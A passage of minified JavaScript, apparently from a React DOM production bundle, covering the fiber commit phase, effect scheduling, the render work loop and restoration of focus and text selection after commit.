t=null;for(gl={focusedElem:e,selectionRange:t},ei=!1,Fe=a;Fe!==null;)if(a=Fe,e=a.child,(a.subtreeFlags&1024)!==0&&e!==null)e.return=a,Fe=e;else for(;Fe!==null;){switch(a=Fe,n=a.alternate,e=a.flags,a.tag){case 0:break;case 11:case 15:break;case 1:if((e&1024)!==0&&n!==null){e=void 0,t=a,o=n.memoizedProps,n=n.memoizedState,s=t.stateNode;try{var Q=Yr(t.type,o,t.elementType===t.type);e=s.getSnapshotBeforeUpdate(Q,n),s.__reactInternalSnapshotBeforeUpdate=e}catch(V){he(t,t.return,V)}}break;case 3:if((e&1024)!==0){if(e=a.stateNode.containerInfo,t=e.nodeType,t===9)yl(e);else if(t===1)switch(e.nodeName){case"HEAD":case"HTML":case"BODY":yl(e);break;default:e.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;default:if((e&1024)!==0)throw Error(m(163))}if(e=a.sibling,e!==null){e.return=a.return,Fe=e;break}Fe=a.return}}function Lm(e,a,t){var s=t.flags;switch(t.tag){case 0:case 11:case 15:hr(e,t),s&4&&js(5,t);break;case 1:if(hr(e,t),s&4)if(e=t.stateNode,a===null)try{e.componentDidMount()}catch(c){he(t,t.return,c)}else{var o=Yr(t.type,a.memoizedProps);a=a.memoizedState;try{e.componentDidUpdate(o,a,e.__reactInternalSnapshotBeforeUpdate)}catch(c){he(t,t.return,c)}}s&64&&Mm(t),s&512&&ys(t,t.return);break;case 3:if(hr(e,t),s&64&&(e=t.updateQueue,e!==null)){if(a=null,t.child!==null)switch(t.child.tag){case 27:case 5:a=t.child.stateNode;break;case 1:a=t.child.stateNode}try{hd(e,a)}catch(c){he(t,t.return,c)}}break;case 27:a===null&&s&4&&qm(t);case 26:case 5:hr(e,t),a===null&&s&4&&Dm(t),s&512&&ys(t,t.return);break;case 12:hr(e,t);break;case 13:hr(e,t),s&4&&Xm(e,t),s&64&&(e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null&&(t=Uh.bind(null,t),sf(e,t))));break;case 22:if(s=t.memoizedState!==null||Ka,!s){a=a!==null&&a.memoizedState!==null||De,o=Ka;var n=De;Ka=s,(De=a)&&!n?fr(e,t,(t.subtreeFlags&8772)!==0):hr(e,t),Ka=o,De=n}break;case 30:break;default:hr(e,t)}}function zm(e){var a=e.alternate;a!==null&&(e.alternate=null,zm(a)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(a=e.stateNode,a!==null&&Ei(a)),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}var Ae=null,sa=!1;function Wa(e,a,t){for(t=t.child;t!==null;)wm(e,a,t),t=t.sibling}function wm(e,a,t){if(ia&&typeof ia.onCommitFiberUnmount=="function")try{ia.onCommitFiberUnmount(kt,t)}catch{}switch(t.tag){case 26:De||Ta(t,a),Wa(e,a,t),t.memoizedState?t.memoizedState.count--:t.stateNode&&(t=t.stateNode,t.parentNode.removeChild(t));break;case 27:De||Ta(t,a);var s=Ae,o=sa;Sr(t.type)&&(Ae=t.stateNode,sa=!1),Wa(e,a,t),Ds(t.stateNode),Ae=s,sa=o;break;case 5:De||Ta(t,a);case 6:if(s=Ae,o=sa,Ae=null,Wa(e,a,t),Ae=s,sa=o,Ae!==null)if(sa)try{(Ae.nodeType===9?Ae.body:Ae.nodeName==="HTML"?Ae.ownerDocument.body:Ae).removeChild(t.stateNode)}catch(n){he(t,a,n)}else try{Ae.removeChild(t.stateNode)}catch(n){he(t,a,n)}break;case 18:Ae!==null&&(sa?(e=Ae,Ru(e.nodeType===9?e.body:e.nodeName==="HTML"?e.ownerDocument.body:e,t.stateNode),Bs(e)):Ru(Ae,t.stateNode));break;case 4:s=Ae,o=sa,Ae=t.stateNode.containerInfo,sa=!0,Wa(e,a,t),Ae=s,sa=o;break;case 0:case 11:case 14:case 15:De||pr(2,t,a),De||pr(4,t,a),Wa(e,a,t);break;case 1:De||(Ta(t,a),s=t.stateNode,typeof s.componentWillUnmount=="function"&&Om(t,a,s)),Wa(e,a,t);break;case 21:Wa(e,a,t);break;case 22:De=(s=De)||t.memoizedState!==null,Wa(e,a,t),De=s;break;default:Wa(e,a,t)}}function Xm(e,a){if(a.memoizedState===null&&(e=a.alternate,e!==null&&(e=e.memoizedState,e!==null&&(e=e.dehydrated,e!==null))))try{Bs(e)}catch(t){he(a,a.return,t)}}function qh(e){switch(e.tag){case 13:case 19:var a=e.stateNode;return a===null&&(a=e.stateNode=new Nm),a;case 22:return e=e.stateNode,a=e._retryCache,a===null&&(a=e._retryCache=new Nm),a;default:throw Error(m(435,e.tag))}}function Qn(e,a){var t=qh(e);a.forEach(function(s){var o=Ih.bind(null,e,s);t.has(s)||(t.add(s),s.then(o,o))})}function da(e,a){var t=a.deletions;if(t!==null)for(var s=0;s<t.length;s++){var o=t[s],n=e,c=a,x=c;e:for(;x!==null;){switch(x.tag){case 27:if(Sr(x.type)){Ae=x.stateNode,sa=!1;break e}break;case 5:Ae=x.stateNode,sa=!1;break e;case 3:case 4:Ae=x.stateNode.containerInfo,sa=!0;break e}x=x.return}if(Ae===null)throw Error(m(160));wm(n,c,o),Ae=null,sa=!1,n=o.alternate,n!==null&&(n.return=null),o.return=null}if(a.subtreeFlags&13878)for(a=a.child;a!==null;)Bm(a,e),a=a.sibling}var Ea=null;function Bm(e,a){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:da(a,e),ma(e),s&4&&(pr(3,e,e.return),js(3,e),pr(5,e,e.return));break;case 1:da(a,e),ma(e),s&512&&(De||t===null||Ta(t,t.return)),s&64&&Ka&&(e=e.updateQueue,e!==null&&(s=e.callbacks,s!==null&&(t=e.shared.hiddenCallbacks,e.shared.hiddenCallbacks=t===null?s:t.concat(s))));break;case 26:var o=Ea;if(da(a,e),ma(e),s&512&&(De||t===null||Ta(t,t.return)),s&4){var n=t!==null?t.memoizedState:null;if(s=e.memoizedState,t===null)if(s===null)if(e.stateNode===null){e:{s=e.type,t=e.memoizedProps,o=o.ownerDocument||o;a:switch(s){case"title":n=o.getElementsByTagName("title")[0],(!n||n[Vt]||n[Ke]||n.namespaceURI==="http://www.w3.org/2000/svg"||n.hasAttribute("itemprop"))&&(n=o.createElement(s),o.head.insertBefore(n,o.querySelector("head > title"))),Qe(n,s,t),n[Ke]=e,Ie(n),s=n;break e;case"link":var c=qu("link","href",o).get(s+(t.href||""));if(c){for(var x=0;x<c.length;x++)if(n=c[x],n.getAttribute("href")===(t.href==null||t.href===""?null:t.href)&&n.getAttribute("rel")===(t.rel==null?null:t.rel)&&n.getAttribute("title")===(t.title==null?null:t.title)&&n.getAttribute("crossorigin")===(t.crossOrigin==null?null:t.crossOrigin)){c.splice(x,1);break a}}n=o.createElement(s),Qe(n,s,t),o.head.appendChild(n);break;case"meta":if(c=qu("meta","content",o).get(s+(t.content||""))){for(x=0;x<c.length;x++)if(n=c[x],n.getAttribute("content")===(t.content==null?null:""+t.content)&&n.getAttribute("name")===(t.name==null?null:t.name)&&n.getAttribute("property")===(t.property==null?null:t.property)&&n.getAttribute("http-equiv")===(t.httpEquiv==null?null:t.httpEquiv)&&n.getAttribute("charset")===(t.charSet==null?null:t.charSet)){c.splice(x,1);break a}}n=o.createElement(s),Qe(n,s,t),o.head.appendChild(n);break;default:throw Error(m(468,s))}n[Ke]=e,Ie(n),s=n}e.stateNode=s}else Nu(o,e.type,e.stateNode);else e.stateNode=Tu(o,s,e.memoizedProps);else n!==s?(n===null?t.stateNode!==null&&(t=t.stateNode,t.parentNode.removeChild(t)):n.count--,s===null?Nu(o,e.type,e.stateNode):Tu(o,s,e.memoizedProps)):s===null&&e.stateNode!==null&&Gn(e,e.memoizedProps,t.memoizedProps)}break;case 27:da(a,e),ma(e),s&512&&(De||t===null||Ta(t,t.return)),t!==null&&s&4&&Gn(e,e.memoizedProps,t.memoizedProps);break;case 5:if(da(a,e),ma(e),s&512&&(De||t===null||Ta(t,t.return)),e.flags&32){o=e.stateNode;try{dt(o,"")}catch(S){he(e,e.return,S)}}s&4&&e.stateNode!=null&&(o=e.memoizedProps,Gn(e,o,t!==null?t.memoizedProps:o)),s&1024&&(Zn=!0);break;case 6:if(da(a,e),ma(e),s&4){if(e.stateNode===null)throw Error(m(162));s=e.memoizedProps,t=e.stateNode;try{t.nodeValue=s}catch(S){he(e,e.return,S)}}break;case 3:if(Wo=null,o=Ea,Ea=Yo(a.containerInfo),da(a,e),Ea=o,ma(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{Bs(a.containerInfo)}catch(S){he(e,e.return,S)}Zn&&(Zn=!1,Pm(e));break;case 4:s=Ea,Ea=Yo(e.stateNode.containerInfo),da(a,e),ma(e),Ea=s;break;case 12:da(a,e),ma(e);break;case 13:da(a,e),ma(e),e.child.flags&8192&&e.memoizedState!==null!=(t!==null&&t.memoizedState!==null)&&(el=Ma()),s&4&&(s=e.updateQueue,s!==null&&(e.updateQueue=null,Qn(e,s)));break;case 22:o=e.memoizedState!==null;var p=t!==null&&t.memoizedState!==null,v=Ka,C=De;if(Ka=v||o,De=C||p,da(a,e),De=C,Ka=v,ma(e),s&8192)e:for(a=e.stateNode,a._visibility=o?a._visibility&-2:a._visibility|1,o&&(t===null||p||Ka||De||Kr(e)),t=null,a=e;;){if(a.tag===5||a.tag===26){if(t===null){p=t=a;try{if(n=p.stateNode,o)c=n.style,typeof c.setProperty=="function"?c.setProperty("display","none","important"):c.display="none";else{x=p.stateNode;var M=p.memoizedProps.style,y=M!=null&&M.hasOwnProperty("display")?M.display:null;x.style.display=y==null||typeof y=="boolean"?"":(""+y).trim()}}catch(S){he(p,p.return,S)}}}else if(a.tag===6){if(t===null){p=a;try{p.stateNode.nodeValue=o?"":p.memoizedProps}catch(S){he(p,p.return,S)}}}else if((a.tag!==22&&a.tag!==23||a.memoizedState===null||a===e)&&a.child!==null){a.child.return=a,a=a.child;continue}if(a===e)break e;for(;a.sibling===null;){if(a.return===null||a.return===e)break e;t===a&&(t=null),a=a.return}t===a&&(t=null),a.sibling.return=a.return,a=a.sibling}s&4&&(s=e.updateQueue,s!==null&&(t=s.retryQueue,t!==null&&(s.retryQueue=null,Qn(e,t))));break;case 19:da(a,e),ma(e),s&4&&(s=e.updateQueue,s!==null&&(e.updateQueue=null,Qn(e,s)));break;case 30:break;case 21:break;default:da(a,e),ma(e)}}function ma(e){var a=e.flags;if(a&2){try{for(var t,s=e.return;s!==null;){if(Tm(s)){t=s;break}s=s.return}if(t==null)throw Error(m(160));switch(t.tag){case 27:var o=t.stateNode,n=Vn(e);wo(e,n,o);break;case 5:var c=t.stateNode;t.flags&32&&(dt(c,""),t.flags&=-33);var x=Vn(e);wo(e,x,c);break;case 3:case 4:var p=t.stateNode.containerInfo,v=Vn(e);Hn(e,v,p);break;default:throw Error(m(161))}}catch(C){he(e,e.return,C)}e.flags&=-3}a&4096&&(e.flags&=-4097)}function Pm(e){if(e.subtreeFlags&1024)for(e=e.child;e!==null;){var a=e;Pm(a),a.tag===5&&a.flags&1024&&a.stateNode.reset(),e=e.sibling}}function hr(e,a){if(a.subtreeFlags&8772)for(a=a.child;a!==null;)Lm(e,a.alternate,a),a=a.sibling}function Kr(e){for(e=e.child;e!==null;){var a=e;switch(a.tag){case 0:case 11:case 14:case 15:pr(4,a,a.return),Kr(a);break;case 1:Ta(a,a.return);var t=a.stateNode;typeof t.componentWillUnmount=="function"&&Om(a,a.return,t),Kr(a);break;case 27:Ds(a.stateNode);case 26:case 5:Ta(a,a.return),Kr(a);break;case 22:a.memoizedState===null&&Kr(a);break;case 30:Kr(a);break;default:Kr(a)}e=e.sibling}}function fr(e,a,t){for(t=t&&(a.subtreeFlags&8772)!==0,a=a.child;a!==null;){var s=a.alternate,o=e,n=a,c=n.flags;switch(n.tag){case 0:case 11:case 15:fr(o,n,t),js(4,n);break;case 1:if(fr(o,n,t),s=n,o=s.stateNode,typeof o.componentDidMount=="function")try{o.componentDidMount()}catch(v){he(s,s.return,v)}if(s=n,o=s.updateQueue,o!==null){var x=s.stateNode;try{var p=o.shared.hiddenCallbacks;if(p!==null)for(o.shared.hiddenCallbacks=null,o=0;o<p.length;o++)pd(p[o],x)}catch(v){he(s,s.return,v)}}t&&c&64&&Mm(n),ys(n,n.return);break;case 27:qm(n);case 26:case 5:fr(o,n,t),t&&s===null&&c&4&&Dm(n),ys(n,n.return);break;case 12:fr(o,n,t);break;case 13:fr(o,n,t),t&&c&4&&Xm(o,n);break;case 22:n.memoizedState===null&&fr(o,n,t),ys(n,n.return);break;case 30:break;default:fr(o,n,t)}a=a.sibling}}function Yn(e,a){var t=null;e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(t=e.memoizedState.cachePool.pool),e=null,a.memoizedState!==null&&a.memoizedState.cachePool!==null&&(e=a.memoizedState.cachePool.pool),e!==t&&(e!=null&&e.refCount++,t!=null&&is(t))}function Kn(e,a){e=null,a.alternate!==null&&(e=a.alternate.memoizedState.cache),a=a.memoizedState.cache,a!==e&&(a.refCount++,e!=null&&is(e))}function qa(e,a,t,s){if(a.subtreeFlags&10256)for(a=a.child;a!==null;)Um(e,a,t,s),a=a.sibling}function Um(e,a,t,s){var o=a.flags;switch(a.tag){case 0:case 11:case 15:qa(e,a,t,s),o&2048&&js(9,a);break;case 1:qa(e,a,t,s);break;case 3:qa(e,a,t,s),o&2048&&(e=null,a.alternate!==null&&(e=a.alternate.memoizedState.cache),a=a.memoizedState.cache,a!==e&&(a.refCount++,e!=null&&is(e)));break;case 12:if(o&2048){qa(e,a,t,s),e=a.stateNode;try{var n=a.memoizedProps,c=n.id,x=n.onPostCommit;typeof x=="function"&&x(c,a.alternate===null?"mount":"update",e.passiveEffectDuration,-0)}catch(p){he(a,a.return,p)}}else qa(e,a,t,s);break;case 13:qa(e,a,t,s);break;case 23:break;case 22:n=a.stateNode,c=a.alternate,a.memoizedState!==null?n._visibility&2?qa(e,a,t,s):Ss(e,a):n._visibility&2?qa(e,a,t,s):(n._visibility|=2,Ot(e,a,t,s,(a.subtreeFlags&10256)!==0)),o&2048&&Yn(c,a);break;case 24:qa(e,a,t,s),o&2048&&Kn(a.alternate,a);break;default:qa(e,a,t,s)}}function Ot(e,a,t,s,o){for(o=o&&(a.subtreeFlags&10256)!==0,a=a.child;a!==null;){var n=e,c=a,x=t,p=s,v=c.flags;switch(c.tag){case 0:case 11:case 15:Ot(n,c,x,p,o),js(8,c);break;case 23:break;case 22:var C=c.stateNode;c.memoizedState!==null?C._visibility&2?Ot(n,c,x,p,o):Ss(n,c):(C._visibility|=2,Ot(n,c,x,p,o)),o&&v&2048&&Yn(c.alternate,c);break;case 24:Ot(n,c,x,p,o),o&&v&2048&&Kn(c.alternate,c);break;default:Ot(n,c,x,p,o)}a=a.sibling}}function Ss(e,a){if(a.subtreeFlags&10256)for(a=a.child;a!==null;){var t=e,s=a,o=s.flags;switch(s.tag){case 22:Ss(t,s),o&2048&&Yn(s.alternate,s);break;case 24:Ss(t,s),o&2048&&Kn(s.alternate,s);break;default:Ss(t,s)}a=a.sibling}}var As=8192;function Dt(e){if(e.subtreeFlags&As)for(e=e.child;e!==null;)Im(e),e=e.sibling}function Im(e){switch(e.tag){case 26:Dt(e),e.flags&As&&e.memoizedState!==null&&gf(Ea,e.memoizedState,e.memoizedProps);break;case 5:Dt(e);break;case 3:case 4:var a=Ea;Ea=Yo(e.stateNode.containerInfo),Dt(e),Ea=a;break;case 22:e.memoizedState===null&&(a=e.alternate,a!==null&&a.memoizedState!==null?(a=As,As=16777216,Dt(e),As=a):Dt(e));break;default:Dt(e)}}function km(e){var a=e.alternate;if(a!==null&&(e=a.child,e!==null)){a.child=null;do a=e.sibling,e.sibling=null,e=a;while(e!==null)}}function Rs(e){var a=e.deletions;if((e.flags&16)!==0){if(a!==null)for(var t=0;t<a.length;t++){var s=a[t];Fe=s,Gm(s,e)}km(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)Fm(e),e=e.sibling}function Fm(e){switch(e.tag){case 0:case 11:case 15:Rs(e),e.flags&2048&&pr(9,e,e.return);break;case 3:Rs(e);break;case 12:Rs(e);break;case 22:var a=e.stateNode;e.memoizedState!==null&&a._visibility&2&&(e.return===null||e.return.tag!==13)?(a._visibility&=-3,Xo(e)):Rs(e);break;default:Rs(e)}}function Xo(e){var a=e.deletions;if((e.flags&16)!==0){if(a!==null)for(var t=0;t<a.length;t++){var s=a[t];Fe=s,Gm(s,e)}km(e)}for(e=e.child;e!==null;){switch(a=e,a.tag){case 0:case 11:case 15:pr(8,a,a.return),Xo(a);break;case 22:t=a.stateNode,t._visibility&2&&(t._visibility&=-3,Xo(a));break;default:Xo(a)}e=e.sibling}}function Gm(e,a){for(;Fe!==null;){var t=Fe;switch(t.tag){case 0:case 11:case 15:pr(8,t,a);break;case 23:case 22:if(t.memoizedState!==null&&t.memoizedState.cachePool!==null){var s=t.memoizedState.cachePool.pool;s!=null&&s.refCount++}break;case 24:is(t.memoizedState.cache)}if(s=t.child,s!==null)s.return=t,Fe=s;else e:for(t=e;Fe!==null;){s=Fe;var o=s.sibling,n=s.return;if(zm(s),s===t){Fe=null;break e}if(o!==null){o.return=n,Fe=o;break e}Fe=n}}}var Nh={getCacheForType:function(e){var a=We(we),t=a.data.get(e);return t===void 0&&(t=e(),a.data.set(e,t)),t}},Lh=typeof WeakMap=="function"?WeakMap:Map,de=0,ve=null,ae=null,te=0,me=0,ua=null,br=!1,Tt=!1,Wn=!1,Ja=0,_e=0,gr=0,Wr=0,Jn=0,Sa=0,qt=0,Es=null,oa=null,$n=!1,el=0,Bo=1/0,Po=null,vr=null,Ze=0,jr=null,Nt=null,Lt=0,al=0,rl=null,Vm=null,Cs=0,tl=null;function xa(){if((de&2)!==0&&te!==0)return te&-te;if(E.T!==null){var e=yt;return e!==0?e:dl()}return nc()}function Hm(){Sa===0&&(Sa=(te&536870912)===0||le?tc():536870912);var e=ya.current;return e!==null&&(e.flags|=32),Sa}function pa(e,a,t){(e===ve&&(me===2||me===9)||e.cancelPendingCommit!==null)&&(zt(e,0),yr(e,te,Sa,!1)),Gt(e,t),((de&2)===0||e!==ve)&&(e===ve&&((de&2)===0&&(Wr|=t),_e===4&&yr(e,te,Sa,!1)),Na(e))}function Zm(e,a,t){if((de&6)!==0)throw Error(m(327));var s=!t&&(a&124)===0&&(a&e.expiredLanes)===0||Ft(e,a),o=s?Xh(e,a):il(e,a,!0),n=s;do{if(o===0){Tt&&!s&&yr(e,a,0,!1);break}else{if(t=e.current.alternate,n&&!zh(t)){o=il(e,a,!1),n=!1;continue}if(o===2){if(n=a,e.errorRecoveryDisabledLanes&n)var c=0;else c=e.pendingLanes&-536870913,c=c!==0?c:c&536870912?536870912:0;if(c!==0){a=c;e:{var x=e;o=Es;var p=x.current.memoizedState.isDehydrated;if(p&&(zt(x,c).flags|=256),c=il(x,c,!1),c!==2){if(Wn&&!p){x.errorRecoveryDisabledLanes|=n,Wr|=n,o=4;break e}n=oa,oa=o,n!==null&&(oa===null?oa=n:oa.push.apply(oa,n))}o=c}if(n=!1,o!==2)continue}}if(o===1){zt(e,0),yr(e,a,0,!0);break}e:{switch(s=e,n=o,n){case 0:case 1:throw Error(m(345));case 4:if((a&4194048)!==a)break;case 6:yr(s,a,Sa,!br);break e;case 2:oa=null;break;case 3:case 5:break;default:throw Error(m(329))}if((a&62914560)===a&&(o=el+300-Ma(),10<o)){if(yr(s,a,Sa,!br),Ys(s,0,!0)!==0)break e;s.timeoutHandle=Su(Qm.bind(null,s,t,oa,Po,$n,a,Sa,Wr,qt,br,n,2,-0,0),o);break e}Qm(s,t,oa,Po,$n,a,Sa,Wr,qt,br,n,0,-0,0)}}break}while(!0);Na(e)}function Qm(e,a,t,s,o,n,c,x,p,v,C,M,y,S){if(e.timeoutHandle=-1,M=a.subtreeFlags,(M&8192||(M&16785408)===16785408)&&(Ns={stylesheets:null,count:0,unsuspend:bf},Im(a),M=vf(),M!==null)){e.cancelPendingCommit=M(au.bind(null,e,a,n,t,s,o,c,x,p,C,1,y,S)),yr(e,n,c,!v);return}au(e,a,n,t,s,o,c,x,p)}function zh(e){for(var a=e;;){var t=a.tag;if((t===0||t===11||t===15)&&a.flags&16384&&(t=a.updateQueue,t!==null&&(t=t.stores,t!==null)))for(var s=0;s<t.length;s++){var o=t[s],n=o.getSnapshot;o=o.value;try{if(!la(n(),o))return!1}catch{return!1}}if(t=a.child,a.subtreeFlags&16384&&t!==null)t.return=a,a=t;else{if(a===e)break;for(;a.sibling===null;){if(a.return===null||a.return===e)return!0;a=a.return}a.sibling.return=a.return,a=a.sibling}}return!0}function yr(e,a,t,s){a&=~Jn,a&=~Wr,e.suspendedLanes|=a,e.pingedLanes&=~a,s&&(e.warmLanes|=a),s=e.expirationTimes;for(var o=a;0<o;){var n=31-na(o),c=1<<n;s[n]=-1,o&=~c}t!==0&&oc(e,t,a)}function Uo(){return(de&6)===0?(_s(0),!1):!0}function sl(){if(ae!==null){if(me===0)var e=ae.return;else e=ae,Ga=Vr=null,yn(e),_t=null,bs=0,e=ae;for(;e!==null;)_m(e.alternate,e),e=e.return;ae=null}}function zt(e,a){var t=e.timeoutHandle;t!==-1&&(e.timeoutHandle=-1,$h(t)),t=e.cancelPendingCommit,t!==null&&(e.cancelPendingCommit=null,t()),sl(),ve=e,ae=t=Ia(e.current,null),te=a,me=0,ua=null,br=!1,Tt=Ft(e,a),Wn=!1,qt=Sa=Jn=Wr=gr=_e=0,oa=Es=null,$n=!1,(a&8)!==0&&(a|=a&32);var s=e.entangledLanes;if(s!==0)for(e=e.entanglements,s&=a;0<s;){var o=31-na(s),n=1<<o;a|=e[o],s&=~n}return Ja=a,no(),t}function Ym(e,a){W=null,E.H=_o,a===ls||a===bo?(a=ud(),me=3):a===cd?(a=ud(),me=4):me=a===xm?8:a!==null&&typeof a=="object"&&typeof a.then=="function"?6:1,ua=a,ae===null&&(_e=1,qo(e,ba(a,e.current)))}function Km(){var e=E.H;return E.H=_o,e===null?_o:e}function Wm(){var e=E.A;return E.A=Nh,e}function ol(){_e=4,br||(te&4194048)!==te&&ya.current!==null||(Tt=!0),(gr&134217727)===0&&(Wr&134217727)===0||ve===null||yr(ve,te,Sa,!1)}function il(e,a,t){var s=de;de|=2;var o=Km(),n=Wm();(ve!==e||te!==a)&&(Po=null,zt(e,a)),a=!1;var c=_e;e:do try{if(me!==0&&ae!==null){var x=ae,p=ua;switch(me){case 8:sl(),c=6;break e;case 3:case 2:case 9:case 6:ya.current===null&&(a=!0);var v=me;if(me=0,ua=null,wt(e,x,p,v),t&&Tt){c=0;break e}break;default:v=me,me=0,ua=null,wt(e,x,p,v)}}wh(),c=_e;break}catch(C){Ym(e,C)}while(!0);return a&&e.shellSuspendCounter++,Ga=Vr=null,de=s,E.H=o,E.A=n,ae===null&&(ve=null,te=0,no()),c}function wh(){for(;ae!==null;)Jm(ae)}function Xh(e,a){var t=de;de|=2;var s=Km(),o=Wm();ve!==e||te!==a?(Po=null,Bo=Ma()+500,zt(e,a)):Tt=Ft(e,a);e:do try{if(me!==0&&ae!==null){a=ae;var n=ua;a:switch(me){case 1:me=0,ua=null,wt(e,a,n,1);break;case 2:case 9:if(dd(n)){me=0,ua=null,$m(a);break}a=function(){me!==2&&me!==9||ve!==e||(me=7),Na(e)},n.then(a,a);break e;case 3:me=7;break e;case 4:me=5;break e;case 7:dd(n)?(me=0,ua=null,$m(a)):(me=0,ua=null,wt(e,a,n,7));break;case 5:var c=null;switch(ae.tag){case 26:c=ae.memoizedState;case 5:case 27:var x=ae;if(!c||Lu(c)){me=0,ua=null;var p=x.sibling;if(p!==null)ae=p;else{var v=x.return;v!==null?(ae=v,Io(v)):ae=null}break a}}me=0,ua=null,wt(e,a,n,5);break;case 6:me=0,ua=null,wt(e,a,n,6);break;case 8:sl(),_e=6;break e;default:throw Error(m(462))}}Bh();break}catch(C){Ym(e,C)}while(!0);return Ga=Vr=null,E.H=s,E.A=o,de=t,ae!==null?0:(ve=null,te=0,no(),_e)}function Bh(){for(;ae!==null&&!ip();)Jm(ae)}function Jm(e){var a=Em(e.alternate,e,Ja);e.memoizedProps=e.pendingProps,a===null?Io(e):ae=a}function $m(e){var a=e,t=a.alternate;switch(a.tag){case 15:case 0:a=vm(t,a,a.pendingProps,a.type,void 0,te);break;case 11:a=vm(t,a,a.pendingProps,a.type.render,a.ref,te);break;case 5:yn(a);default:_m(t,a),a=ae=ed(a,Ja),a=Em(t,a,Ja)}e.memoizedProps=e.pendingProps,a===null?Io(e):ae=a}function wt(e,a,t,s){Ga=Vr=null,yn(a),_t=null,bs=0;var o=a.return;try{if(_h(e,o,a,t,te)){_e=1,qo(e,ba(t,e.current)),ae=null;return}}catch(n){if(o!==null)throw ae=o,n;_e=1,qo(e,ba(t,e.current)),ae=null;return}a.flags&32768?(le||s===1?e=!0:Tt||(te&536870912)!==0?e=!1:(br=e=!0,(s===2||s===9||s===3||s===6)&&(s=ya.current,s!==null&&s.tag===13&&(s.flags|=16384))),eu(a,e)):Io(a)}function Io(e){var a=e;do{if((a.flags&32768)!==0){eu(a,br);return}e=a.return;var t=Oh(a.alternate,a,Ja);if(t!==null){ae=t;return}if(a=a.sibling,a!==null){ae=a;return}ae=a=e}while(a!==null);_e===0&&(_e=5)}function eu(e,a){do{var t=Dh(e.alternate,e);if(t!==null){t.flags&=32767,ae=t;return}if(t=e.return,t!==null&&(t.flags|=32768,t.subtreeFlags=0,t.deletions=null),!a&&(e=e.sibling,e!==null)){ae=e;return}ae=e=t}while(e!==null);_e=6,ae=null}function au(e,a,t,s,o,n,c,x,p){e.cancelPendingCommit=null;do ko();while(Ze!==0);if((de&6)!==0)throw Error(m(327));if(a!==null){if(a===e.current)throw Error(m(177));if(n=a.lanes|a.childLanes,n|=Yi,fp(e,t,n,c,x,p),e===ve&&(ae=ve=null,te=0),Nt=a,jr=e,Lt=t,al=n,rl=o,Vm=s,(a.subtreeFlags&10256)!==0||(a.flags&10256)!==0?(e.callbackNode=null,e.callbackPriority=0,kh(Hs,function(){return iu(),null})):(e.callbackNode=null,e.callbackPriority=0),s=(a.flags&13878)!==0,(a.subtreeFlags&13878)!==0||s){s=E.T,E.T=null,o=N.p,N.p=2,c=de,de|=4;try{Th(e,a,t)}finally{de=c,N.p=o,E.T=s}}Ze=1,ru(),tu(),su()}}function ru(){if(Ze===1){Ze=0;var e=jr,a=Nt,t=(a.flags&13878)!==0;if((a.subtreeFlags&13878)!==0||t){t=E.T,E.T=null;var s=N.p;N.p=2;var o=de;de|=4;try{Bm(a,e);var n=gl,c=Gc(e.containerInfo),x=n.focusedElem,p=n.selectionRange;if(c!==x&&x&&x.ownerDocument&&Fc(x.ownerDocument.documentElement,x)){if(p!==null&&Gi(x)){var v=p.start,C=p.end;if(C===void 0&&(C=v),"selectionStart"in x)x.selectionStart=v,x.selectionEnd=Math.min(C,x.value.length);else{var M=x.ownerDocument||document,y=M&&M.defaultView||window;if(y.getSelection){var S=y.getSelection(),Q=x.textContent.length,V=Math.min(p.start,Q),pe=p.end===void 0?V:Math.min(p.end,Q);!S.extend&&V>pe&&(c=pe,pe=V,V=c);var b=kc(x,V),h=kc(x,pe);if(b&&h&&(S.rangeCount!==1||S.anchorNode!==b.node||S.anchorOffset!==b.offset||S.focusNode!==h.node||S.focusOffset!==h.offset)){var g=M.createRange();g.setStart(b.node,b.offset),S.removeAllRanges(),V>pe?(S.addRange(g),S.extend(h.node,h.offset)):(g.setEnd(h.node,h.offset),S.addRange(g))}}}}for(M=[],S=x;S=S.parentNode;)S.nodeType===1&&M.push({element:S,left:S.scrollLeft,top:S.scrollTop});for(typeof x.focus=="function"&&x.focus(),x=0;x<M.length;x++){var _=M[x];_.element.scrollLeft=_.left,_.element.scrollTop=_.top}}ei=!!bl,gl=bl=null}finally{de=o,N.p=s,E.T=t}}e.current=a,Ze=2}}function tu(){if(Ze===2){Ze=0;var e=jr,a=Nt,t=(a.flags&8772)!==0;if((a.subtreeFlags&8772)!==0||t){t=E.T,E.T=null;var s=N.p;N.p=2;var o=de;de|=4;try{Lm(e,a.alternate,a)}finally{de=o,N.p=s,E.T=t}}Ze=3}}function su(){if(Ze===4||Ze===3){Ze=0,np();var e=jr,a=Nt,t=Lt,s=Vm;(a.subtreeFlags&10256)!==0||(a.flags&10256)!==0?Ze=5:(Ze=0,Nt=jr=null,ou(e,e.pendingLanes));var o=e.pendingLanes;if(o===0&&(vr=null),Ai(t),a=a.stateNode,ia&&typeof ia.onCommitFiberRoot=="function")try{ia.onCommitFiberRoot(kt,a,void 0,(a.current.flags&128)===128)}catch{}if(s!==null){a=E.T,o=N.p,N.p=2,E.T=null;try{for(var n=e.onRecoverableError,c=0;c<s.length;c++){var x=s[c];n(x.value,{componentStack:x.stack})}}finally{E.T=a,N.p=o}}(Lt&3)!==0&&ko(),Na(e),o=e.pendingLanes,(t&4194090)!==0&&(o&42)!==0?e===tl?Cs++:(Cs=0,tl=e):Cs=0,_s(0)}}function ou(e,a){(e.pooledCacheLanes&=a)===0&&(a=e.pooledCache,a!=null&&(e.pooledCache=null,is(a)))}function ko(e){return ru(),tu(),su(),iu()}function iu(){if(Ze!==5)return!1;var e=jr,a=al;al=0;var t=Ai(Lt),s=E.T,o=N.p;try{N.p=32>t?32:t,E.T=null,t=rl,rl=null;var n=jr,c=Lt;if(Ze=0,Nt=jr=null,Lt=0,(de&6)!==0)throw Error(m(331));var x=de;if(de|=4,Fm(n.current),Um(n,n.current,c,t),de=x,_s(0,!1),ia&&typeof 